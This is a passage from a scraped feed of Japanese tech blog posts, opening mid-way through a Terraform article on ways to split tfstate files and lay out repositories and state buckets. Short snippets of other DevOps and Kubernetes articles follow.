backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する      ...# 共有networkコンポーネントの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-network-repository/├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── route53.tf├── vpc.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 foo-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 bar-product/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合同じテナント内のプロダクトの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 foo-product│    └── terraform.tfstate # fooプロダクトの状態を持つ│├── \uD83D\uDCC2 bar-product│    └── terraform.tfstate # barプロダクトの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの種類グループ別この分割方法についてAWSリソースの種類グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各AWSリソースの種類グループも管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。特にこの分割方法は、グループ数がどんどん増えていく可能性があります\uD83D\uDE07【種類グループ別】状態の依存関係図例えば、以下の種類グループに分割した状況と仮定します。application (Webサーバー、Appサーバー系)auth (認証/認可系)datastore (DBサーバー系)cicd (CI/CD系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、networkグループやauthグループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの種類グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>例: ALB, API Gateway, CloudFront, EC2, ECS, EKS, SNS, など\\"]            auth[\\"auth-tfstate<br>例: IAM, など\\"]            cicd[\\"cicd-tfstate<br>例: Code3兄弟, など\\"]            monitor[\\"monitor-tfstate<br>例: CloudWatch, など\\"]            network[\\"network-tfstate<br>例: Route53, VPC, など\\"]            datastore[\\"datastore-tfstate<br>例: ElastiCache, RDS, S3, など\\"]            application-....->auth            application-..->datastore            application-...->network            cicd-..->application            datastore-..->network            monitor-..->application            monitor-..->datastore       end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── alb.tf│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 cicd/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── codebuild.tf│    ├── codecommit.tf│    ├── codedeploy.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # cicdコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 datastore/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── rds.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # datastoreコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから参照できるように、outputブロックを定義する      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 cicd│    └── terraform.tfstate # cicdコンポーネントの状態を持つ│├── \uD83D\uDCC2 datastore│    └── terraform.tfstate # datastoreコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの状態の変更頻度グループ別この分割方法についてAWSリソースの状態の変更頻度グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各変更頻度グループの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。https://www.reddit.com/r/Terraform/comments/126jwa1/comment/jea9bjk/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button▶ おすすめ度について【変更頻度グループ別】状態の依存関係図例えば、以下の変更頻度グループに分割した状況と仮定します。変更高頻度グループ変更中頻度グループ変更低頻度グループここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、変更低頻度グループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの状態の変更頻度グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            high[\\"high-freq-tfstate<br>例: API Gateway, CloudFront, CloudWatch, IAM\\"]            middle[\\"middle-freq-tfstate<br>例: ALB, EC2, ECS, EKS, ElastiCache, RDS, S3, SES, SNS\\"]            low[\\"low-freq-tfstate<br>例: Route53, VPC\\"]            high-...->low            middle-..->low        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 high-freq # 高頻度変更グループ│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── cloudwatch.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 low-freq # 低頻度変更グループ│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── route53.tf│    ├── vpc.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 middle-freq # 中頻度変更グループ (高頻度とも低頻度とも言えないリソース)      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── elasticache.tf      ├── rds.tf      ├── s3.tf      ├── ses.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する           ...【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 high-freq│    └── terraform.tfstate # high-freqコンポーネントの状態を持つ│├── \uD83D\uDCC2 middle-freq│    └── terraform.tfstate # middle-freqコンポーネントの状態を持つ│└── \uD83D\uDCC2 low-freq      └── terraform.tfstate # low-freqコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...10. おわりにTerraformのtfstateファイルの分割パターンをもりもり布教しました。ぜひ採用してみたい分割パターンはあったでしょうか。Terraformの開発現場の具体的な要件は千差万別であり、特にtfstateファイル間の状態の依存関係は様々です。もし、この記事を参考に設計してくださる方は、分割パターンを現場に落とし込んで解釈いただけると幸いです\uD83D\uDE47\uD83C\uDFFB‍「自分を信じても…信頼に足る仲間を信じても…誰にもわからない…」(お友達の@nwiizo, 2023, Terraform Modules で再利用できるので最高ではないでしょうか？)謝辞今回、Terraformの分割パターンの収集にあたり、以下の方々からの意見・実装方法も参考にさせていただきました。@kiyo_12_07 さん@masasuzu さん@tozastation さん(アルファベット順)この場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Terraform in Action (English Edition)作者:Winkler, ScottManningAmazonTerraform: Up & Running; Writing Infrastructure As Code作者:Brikman, YevgeniyオライリージャパンAmazon","isoDate":"2023-07-04T15:17:56.000Z","dateMiliSeconds":1688483876000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"光に負けルナ~Google Cloudでのマルチリージョンデータベースについて~","link":"https://zenn.dev/nnaka2992/articles/to_beat_light_speed_on_google_cloud_databases","contentSnippet":"クラウドを利用する一番のメリットの一つとしてオンデマンドでリソースを調達し、アクセス負荷に応じてスケールイン・アウト出来ることが上げられます。そのため大体のアプリケーションではシングルリージョンまたは隣接するリージョン2~3程度で運用を始めることが多いと思います。(日本の場合asia-northeast-1とasia-northeast-2など)アプリケーションがグローバルに拡大すると、それだけ物理的な距離が広がりユーザ・サーバ間のアクセスにかかる時間が拡大します。例えばユーザ・サーバ共に日本にある場合(沖縄・北海道間約3,000km)、ネットワークによる遅延は片道約15ms以下...","isoDate":"2023-07-03T15:39:08.000Z","dateMiliSeconds":1688398748000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"スリーシェイクに入社しました！","link":"https://bells17.medium.com/3-shake-279ea982b977?source=rss-713cf42ce34d------2","isoDate":"2023-07-03T14:10:50.000Z","dateMiliSeconds":1688393450000,"authorName":"bells17","authorId":"bells17"},{"title":"Copilotでらくらくコードリーディング","link":"https://zenn.dev/nnaka2992/articles/code_reading_with_copilot","contentSnippet":"GitHub Copilot便利ですね。2021年にTechnical Previewとして発表された時から便利だ便利だと言われていたGitHub Copilotに、2023年の4月末ごろからデビューしました。デビューしたは良いものの最近は仕事ではコーディングよりアーキテクト的な方面でのお仕事が多かったり、個人の時間でもコーディングするよりOSSのコードを読むことのほうが多くコーディングのアシスタントツールとしては使いこなせていません。そのため最近はPostgreSQLのコードを読むときのアシスタントとして利用することが多いです。なのでこの記事ではCopilotでコードリーディン...","isoDate":"2023-06-28T14:41:21.000Z","dateMiliSeconds":1687963281000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud RunのSidecarでJVMのmetricsの取得してみた","link":"https://zenn.dev/satohjohn/articles/25bc5879de7832","contentSnippet":"概要Cloud Runのmetricsをデフォルトで取得している指標(metrics)以外の指標が他に欲しい場合、どうするのが良いのかを考えてみました。ちょうどCloud RunのSidecar機能がでたので、それを使います。他の指標を、ここではJVMのmetricsとします。Cloud Run上のJVMのmetricsが取れて何が嬉しいのかについては、一旦考えません。後にCloud Runの最大起動時間が増えた場合は、意味があるかもしれません。 構成図にすると以下のような感じになります。Cloud RunでSpring Bootアプリケーションを立ち上げClou...","isoDate":"2023-06-28T12:03:00.000Z","dateMiliSeconds":1687953780000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ロクに勉強してこなかったエンジニアが輪読会参加とかPCA受験に向けて勉強とかしてみた話","link":"https://qiita.com/bayobayo0324/items/56f93f50fa0115dc4d6d","contentSnippet":"この記事について40歳でフリーランスから転職をきっかけに会社員エンジニアになって、社内のエンジニアの熱意に影響を受けて勉強をはじめてみた中年エンジニアの感想とか気づきとかです。先に結論勉強することってほんと良いなと。脳細胞が活性化する気がします。あと、自分のなか...","isoDate":"2023-06-27T12:31:17.000Z","dateMiliSeconds":1687869077000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"SRETT#6_Terraformのtfstateについて考える","link":"https://speakerdeck.com/masasuzu/srett-number-6-terraformnotfstatenituitekao-eru","contentSnippet":"","isoDate":"2023-06-22T04:00:00.000Z","dateMiliSeconds":1687406400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"アプリ開発者のための kubectl 講座","link":"https://zenn.dev/toshikish/articles/6a06017747cbba","contentSnippet":"これは何Kubernetes クラスタ管理者とアプリケーション開発者が分業しているプロジェクトで，開発者が必ずしも Kubernetes に詳しくない場合を想定し，開発時に使いそうな kubectl のコマンドをまとめたものです。クラスタ管理者から開発者にこのドキュメントを適宜改変して渡し，開発者がある程度自立して操作できるようになることで，管理者への問い合わせ負荷を減らすのが狙いです。場合によってはハンズオンで講座を開いてもよいでしょう。 ドキュメント案ここでは Amazon EKS でクラスタを構築する場合の例を示します。別のインフラに構築している場合は適宜書き換え...","isoDate":"2023-06-19T06:03:18.000Z","dateMiliSeconds":1687154598000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Terraform 静的検査ツール比較","link":"https://zenn.dev/tayusa/articles/9829faf765ab67","contentSnippet":"対象tfsectflintKICSCheckovSnyk tfsechttps://github.com/aquasecurity/tfsechttps://aquasecurity.github.io/tfsec/v1.28.1 特徴CI系公式のdocker imageがあるhttps://github.com/aquasecurity/tfsec#use-with-dockerGitHub Actionがあるhttps://github.com/aquasecurity/tfsec-pr-commenter-actionGitH...","isoDate":"2023-06-15T17:00:00.000Z","dateMiliSeconds":1686848400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"editcap で tcpdump のキャプチャファイルから指定の時間帯を切り出す","link":"https://blog.1q77.com/2023/06/editcap/","contentSnippet":"課題ちょっと大きめ (時間範囲の広い) pcap ファイルがあって、wireshark で見るにしてもちょっと大きすぎるなということがありました。見たい時間帯だけに絞ったファイルにできないかなと思い調べたメモです。","isoDate":"2023-06-15T14:46:42.000Z","dateMiliSeconds":1686840402000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub の Reusable workflow で working-directory に変数を使う","link":"https://zenn.dev/toshikish/articles/be970407f02098","contentSnippet":"やりたいことGitHub Actions の reusable workflow で，作業ディレクトリを入力変数で変えたい場合を考えます。on:  workflow_call:    inputs:      workdir:        required: true        type: string うまくいかない方法ワークフロー全体のステップのデフォルト設定 defaults.run.working-directory では，現時点ではコンテキストと式が許可されていません。したがって，入力変数でディレクトリ名を受け取って上記に入れても動作しません。...","isoDate":"2023-06-15T05:22:24.000Z","dateMiliSeconds":1686806544000,"authorName":"toshikish","authorId":"toshikish"},{"title":"KubeconformをGitLab CIに組み込んで、k8sのマニフェストがAPIの仕様に沿うか検査する","link":"https://zenn.dev/tayusa/articles/1aa96e6ceb838a","contentSnippet":"はじめにk8sマニフェストを普段管理していないメンバーがマニフェストのファイルを変更する場面があります。その際のレビューを出来るだけ自動化したくkubeconformを導入しました。 KubeconformマニフェストがAPIの仕様に沿うか検査してくれます。https://github.com/yannh/kubeconform自分でスキーマを用意すればIstio、Argo Rollouts、Argo Workflowsのような外部のAPIも検査できます。 スキーマの生成スキーマの生成はpythonのスクリプトが用意されているので、これをCRDを引数で渡し実行しま...","isoDate":"2023-06-11T17:19:45.000Z","dateMiliSeconds":1686503985000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"plutoをGitLab CIに組み込んで非推奨のk8s apiVersionを検出する","link":"https://zenn.dev/tayusa/articles/79a3f54d8f21bc","contentSnippet":"はじめにk8sのバージョンが上がるとAPIが再編成されたりアップグレードされたりします。新しいAPIが出ると古いAPIは非推奨になり最終的には削除されます。なので、k8sのバージョンアップ時はDeprecated API Migration Guideなどを見て非推奨のapiVersionが使われていないか確認して時には修正する必要があります。https://kubernetes.io/docs/reference/using-api/deprecation-guide/例CronJob の batch/v1beta1 -> batch/v1 plutoplu...","isoDate":"2023-06-11T17:18:13.000Z","dateMiliSeconds":1686503893000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Istio Canary Upgrade by Helm","link":"https://zenn.dev/tayusa/articles/03cf961e2409bd","contentSnippet":"前提helmfileを利用istioのrevisionTagを利用関係のない設定は省略 Upgradeの前にInstall ディレクトリ構成├── helmfile_istio-base.yaml├── helmfile_istio-ingressgateway.yaml├── helmfile_istiod-1-16-0.yaml└── values    ├── istio-base.yaml    ├── istio-ingressgateway.yaml    └── istiod.yaml helmfile helmfile_isti...","isoDate":"2023-06-11T17:17:37.000Z","dateMiliSeconds":1686503857000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Helmに入門したので、躓いたところを振り返る","link":"https://zenn.dev/tayusa/articles/e9285c6c4c09a1","contentSnippet":"はじめにアプリのマニフェストを管理するのにKustomizeを使っていたのですが、同じようなマニフェストが乱立したので管理を楽にするためにHelmに移行しました。Helmを一から書いたのは初めてだったので、躓いた点をここに残します。 quote関数の進数変換0から始まる数値をquote関数を使って文字列にすると進数変換が起こり想定した値ではなくなる下記のようなtemplateでidとして0000000060のような値を渡すと、8進数として解釈され10進数である48に変換されてしまいます。...id: {{ .id | quote }}...0から始まる数値はtem...","isoDate":"2023-06-11T17:16:25.000Z","dateMiliSeconds":1686503785000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Go言語でNetlinkを少し触った話","link":"https://zenn.dev/bells17/articles/netlink-goexample","contentSnippet":"Go言語でNetlinkを少し触ったのでメモ。具体的にはGo言語でNetlinkというネットワーク関連のライブラリを使ってStatic Routeを設定したりするサンプルを作ったりした。https://github.com/bells17/netlink-gosample Netlinkとは調べた範囲だと、Linuxカーネルのサブシステムの1つで、ルーティングテーブルの管理などのネットワーク関連の設定などを行う際に利用されるもの、という理解をしている。Netlinkは、Linuxカーネルとユーザ空間プロセス間の、またはカーネル内の通信を提供するためのIPC（Inter-pro...","isoDate":"2023-06-08T18:03:10.000Z","dateMiliSeconds":1686247390000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes 1.27 以降のバッチ処理の改善","link":"https://zenn.dev/toversus/articles/d6065bea460871","contentSnippet":"Kubernetes 1.27 以降で実装済みまたは予定されているバッチ処理の改善に繋がる KEP や Kubernetes のサブプロジェクトの現状を見ていきます。 KEP-3673: Kubelet limit of Parallel Image Pulls!Kubernetes 1.27 時点でアルファ機能です。1.28 でベータを目指していますが、設定はデフォルトで無効化されています。Pod の起動にノードのスケールアウトが必要な場合に、Pod の起動時間の短縮が期待できます。バッチ処理の Pod が一斉に起動するケースで恩恵を受けられそうです。Kubelet は...","isoDate":"2023-06-08T03:46:32.000Z","dateMiliSeconds":1686195992000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"asdf の代わりに rtx を使う","link":"https://blog.1q77.com/2023/06/rtx/","contentSnippet":"asdf とはnodeenv とか rbenv とか tfenv とか XXenv がそれぞれ .xxx-version というファイルにそのディレクトリ配下で使用する software の version を指定するという仕様があり、それらをまとめてやってくれる asdf というツールが登場し、.tool-versions というファイルに複数のソフトウェアのバージョンを指定できるようになりました。 (aqua はまだ使ったことがない)","isoDate":"2023-06-07T01:25:11.000Z","dateMiliSeconds":1686101111000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"PC作ってみた","link":"https://moz-security.hatenablog.com/entry/2023/06/04/172414","contentSnippet":"SECCON Beginners CTF 2023 でボコボコにされて、少し萎えていますが、超絶久しぶりにブログでも書きます。なぜ自作PCまず、4月29, 30日（土・日）にGMOインターネットグループが開催するDevSecOpsThon2023というイベントに参加しました。これに関しては、イベント直後に、参加記を書こうと思っていたのですが、書かんといけないな〜と思いながら、2週間も経つと、完全に書く気がなくなりました。気になる方は、下に他の参加者さんが書いたリンクを貼っているのでそちらからご覧ください。イベントの参加者には、自宅サーバ勢が多く、確か半分くらいは、自宅にサーバを立てていたと思います。イベント自体が、インフラハッカソンというちょっと変わったイベントで、ハードウェアやOS、ミドルウェアといった低レイヤの知識を必要としており、もう自宅サーバ勢が無双状態で、自分の知識の欠如を非常に実感しました。そこで、その人たちに近づくための第一歩として、自作PCに取り組もうと思いました。developers.gmo.jpDevSecOpsThon2023 参加ブログ・DevSecOpsThonに参加してきた・「DevSecOpsThon at GMO kitaQ」に参加したらすごく良かった件！！ - Qiita・DevSecOpsThon2023 at GMO kitaQ - Qiita・【\uD83D\uDCDD】DevSecOpsThon at GMO kitaQ\xa0自作PCに取り組むこれに取り組んだのは、5月27, 28日でした。この理由は、25日に給料日だったからですね。まずは、パーツの選択と購入から始めました。別にゲーム用途ではないため、GPUはいらない代わりに、グラフィック機能があるCPUにしたり、メモリの拡張性を考えて、4スロットあるマザーボードにしたりしました。初めての自作PCということで、そこまでスペックのいいものを作る気は最初からなく、まぁ10万円くらいかなと考えていたのですが、メモリやSSDが思ったよりも安く、7万円くらいで全てのパーツを購入することができました。購入したパーツが届いたら、あとは組み立てるだけでした。ググったら、自作PCについてのサイトはたくさん出てきましたが、正直マザーボードとPCケースの取扱説明書だけでも十分なほど説明が細かく書いてあります。全てのパーツをマザーボードにくっつけるだけなので、そこまで難しくはなく、電源など配線が終わったら、本当に起動してくれるのかドキドキしながら、電源ボタンを押しました。プラス端子とマイナス端子を逆にしていないかなど心配しながらも、BIOS画面が立ち上がった時はとても安心したし、嬉しかったです。ここまできたら、あとはブータブルUSBからOSを起動するだけで、無事に初めての自作PCを完成させることができました。今は、仮想マシンを複数台起動していて、それを使って、遊びつつ、勉強していこうと思っています。とりあえずは、Kubernetesクラスタを組んでみたり、脆弱性検証から始めていこうって感じです。自作PCのメモについては、下のリンク先にあります。moz-security.me作ってみて自作PCというと、とてもハードルが高いように感じますが、実際に作ってみると意外と簡単だし、色々と勉強になることもたくさんあります。また、デスクトップという制約はあるものの、同じ値段であれば、ノートPCよりもいいスペックで構築することができるし、店頭にあるデスクトップPCと比べても、自分で改造できるため、拡張性